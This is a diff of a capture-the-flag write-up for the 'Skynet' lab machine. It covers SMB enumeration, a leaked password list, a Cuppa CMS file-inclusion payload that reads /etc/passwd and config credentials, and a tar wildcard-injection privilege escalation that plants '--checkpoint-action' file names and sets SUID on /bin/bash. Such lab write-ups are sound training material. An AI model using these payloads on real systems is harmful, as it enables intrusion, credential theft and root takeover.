@@ -1,7 +1,7 @@
 <table>
   <tr>
     <td>
-      <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/78628bbf76bf1992a8420cdb43e59f2d.jpeg" width="130">
+      <img src="./images/unnamed.jpg" width="900">
     </td>
     <td width="900">
       <h1>Skynet — Write-up</h1>
@@ -88,13 +88,11 @@ Workgroup            Master
 WORKGROUP            SKYNET
 ```
 
-Findings
+#### Findings
+* anonymous: An SMB share explicitly labeled as Skynet Anonymous Share. This is highly likely to contain useful information.
+* milesdyson: A personal share belonging to Miles Dyson. Access will likely require valid credentials.
 
-anonymous: An SMB share explicitly labeled as Skynet Anonymous Share. This is highly likely to contain useful information.
-
-milesdyson: A personal share belonging to Miles Dyson. Access will likely require valid credentials.
-
-Accessing the Anonymous Share
+### Accessing the Anonymous Share
 
 ```bash
 smbclient //$TARGET_IP/anonymous
@@ -125,16 +123,16 @@ log3.txt                            N        0  Wed Sep 18 01:42:16 2019
 smb: \logs\> get log1.txt
 ```
 
-File Content Analysis
+#### File Content Analysis
 
-attention.txt
+> attention.txt
 ```text
 A recent system malfunction has caused various passwords to be changed. 
 All skynet employees are required to change their password after seeing this.
 
 -Miles Dyson
 ```
-log1.txt
+> log1.txt
 ```text
 cyborg007haloterminator
 terminator22596
@@ -168,13 +166,10 @@ Walterminator
 79terminator6
 1996terminator
 ```
-Analysis Summary
-
-attention.txt contains a notice from Miles Dyson indicating that employee passwords were recently changed.
-
-log1.txt appears to be a password wordlist, likely related to the password changes mentioned in the note.
-
-This wordlist may be useful for credential attacks against email services or SMB authentication.
+#### Analysis Summary
+* attention.txt contains a notice from Miles Dyson indicating that employee passwords were recently changed.
+* log1.txt appears to be a password wordlist, likely related to the password changes mentioned in the note.
+* This wordlist may be useful for credential attacks against email services or SMB authentication.
 
 ## 🌐 Web Enumeration
 
@@ -213,20 +208,18 @@ Starting gobuster in directory enumeration mode
 Finished
 ===============================================================
 ```
-Key Findings
+#### Key Findings
 
-/squirrelmail: A web-based email client (SquirrelMail), confirming the presence of an accessible webmail login interface.
+* /squirrelmail: A web-based email client (SquirrelMail), confirming the presence of an accessible webmail login interface.
+* /admin and /config: Standard directories that may contain sensitive information, although access appears to be restricted or redirected.
 
-/admin and /config: Standard directories that may contain sensitive information, although access appears to be restricted or redirected.
-
-The presence of SquirrelMail aligns with the POP3/IMAP services discovered during Nmap enumeration.
+> The presence of SquirrelMail aligns with the POP3/IMAP services discovered during Nmap enumeration.
 
 ### Next Steps
 
 Given the discovery of a webmail interface and the previously obtained password wordlist, the next step is to attempt credential-based attacks against the SquirrelMail login portal.
 
-### SquirrelMail Login Interface
-<img src="./images/image.png" alt="SquirrelMail login page" width="1200">
+# SquirrelMail Login Interface
 
 ## 🔐 Credential Attack — SquirrelMail
 
@@ -348,7 +341,7 @@ Finished
 The scan reveals an administrator login panel, indicating the presence of a web-based CMS administration interface.
 
 http://10.64.185.128/45kra24zxs28v3yd/administrator/
-<img src="./images/image-4.png" alt="CMS administrator login page" width="1200">
+<img src="./images/image-4.png" alt="CMS administrator login page" width="1000">
 
 
 ## 🧨 Vulnerability Identification — Cuppa CMS
@@ -377,7 +370,7 @@ During the analysis of the Cuppa CMS administrator panel, a Local File Inclusion
 This behavior allows arbitrary local files to be included and rendered by the PHP interpreter. To confirm the vulnerability, the system file /etc/passwd was requested using an absolute path, which successfully returned its contents:
 
 http://TARGET/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd
-<img src="./images/Captura de tela_2025-12-28_10-17-28.png" alt="/etc/passwd" whidth="1200">
+<img src="./images/Captura de tela_2025-12-28_10-17-28.png" alt="/etc/passwd" width="1200">
 
 
 The successful disclosure of /etc/passwd confirms that the backend uses an insecure include() operation and accepts absolute file paths, proving full read access to local files on the server.
@@ -389,7 +382,7 @@ To confirm the vulnerability, the php://filter wrapper was used to safely read a
 Payload used:
 
 http://10.66.167.158/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-<img src="./images/configphp.png" alt="config.php" whidth="1200">
+<img src="./images/configphp.png" alt="config.php" width="1200">
 
 
 The request successfully returned a Base64-encoded response, confirming that arbitrary local files can be read via the urlConfig parameter.
@@ -408,6 +401,8 @@ echo "PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3
 ```
 
 ```php
+Decode text:
+
 <?php 
         class Configuration{
                 public $host = "localhost";
@@ -440,7 +435,7 @@ echo "PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3
 
 This significantly increases the attack surface and enables lateral movement, including database access and potential remote code execution.
 
-## Exploitation — Remote File Inclusion (RFI) to Remote Code Execution (RCE)
+# Exploitation — Remote File Inclusion (RFI) to Remote Code Execution (RCE)
 
 
 ### 1 - Preparation & Listener Setup
@@ -479,5 +474,110 @@ www-data@skynet:/$ cd /home/milesdyson
 www-data@skynet:/home/milesdyson$ ls
 backups  mail  share  user.txt
 www-data@skynet:/home/milesdyson$ cat user.txt
-7ce5c2109a40f958099283600a9ae807
+FLAG = [REDACTED]
 ```
+---
+
+---
+
+# 🪜 Privilege Escalation:
+
+After gaining initial access as www-data, the next step is to look for misconfigurations or scheduled tasks that run with higher privileges. A common place to find these is the system-wide crontab.
+
+#### Checking Scheduled Tasks (Cron Jobs)
+```bash
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+```
+#### Inspecting File Permissions
+```bash
+www-data@skynet:/home/milesdyson/backups$ ls -la
+ls -la
+total 4584
+drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
+drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
+-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
+-rw-r--r-- 1 root       root       4679680 Dec 28 10:06 backup.tgz
+```
+#### 📌 As the www-data user, we cannot modify the backup.sh script directly because we lack write permissions (-rwxr-xr-x). To escalate privileges, we must find a vulnerability within the commands executed by the script itself.
+
+#### Analyzing Script Logic
+```bash
+www-data@skynet:/home/milesdyson/backups$ cat backup.sh
+cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+The script uses a wildcard (*) with the tar command. Since the shell expands the asterisk into a list of filenames, we can inject command-line arguments by creating files with specific names.
+
+#### 📂 Directory Permissions Analysis
+The directory is owned by www-data. This confirms that we have the necessary permissions to create the malicious files
+```bash
+www-data@skynet:/var/www/html$ ls -la
+ls -la
+total 68
+drwxr-xr-x 8 www-data www-data  4096 Nov 26  2020 .
+drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
+drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
+drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
+drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
+drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
+drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
+-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
+-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
+drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
+-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
+
+```
+#### Create the payload
+```bash
+www-data@skynet:/var/www/html$ echo "chmod +s /bin/bash" > exploit.sh
+```
+#### Create the malicious flags
+```bash
+www-data@skynet:/var/www/html$ touch ./"--checkpoint=1"
+touch ./"--checkpoint=1"
+```
+```bash
+www-data@skynet:/var/www/html$ touch ./"--checkpoint-action=exec=sh exploit.sh"
+touch ./"--checkpoint-action=exec=sh exploit.sh"
+```
+### Gaining Root Access
+
+After waiting one minute for the cron job to execute, I checked the permissions of the Bash binary. The SUID bit was successfully applied:
+```bash
+www-data@skynet:/var/www/html$ ls -la /bin/bash
+ls -la /bin/bash
+-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
+```
+I then executed Bash with the -p flag to drop into a root shell:
+
+```bash
+www-data@skynet:/var/www/html$ /bin/bash -p
+/bin/bash -p
+bash-4.3# 
+```
+### Final Flag
+Finally, I navigated to the root directory and retrieved the flag:
+```bash
+cat /root/root.txt
+# Flag: [REDACTED]
+```
+
+> # PWNED! 🚩
+> ##By Hirt, Nelson
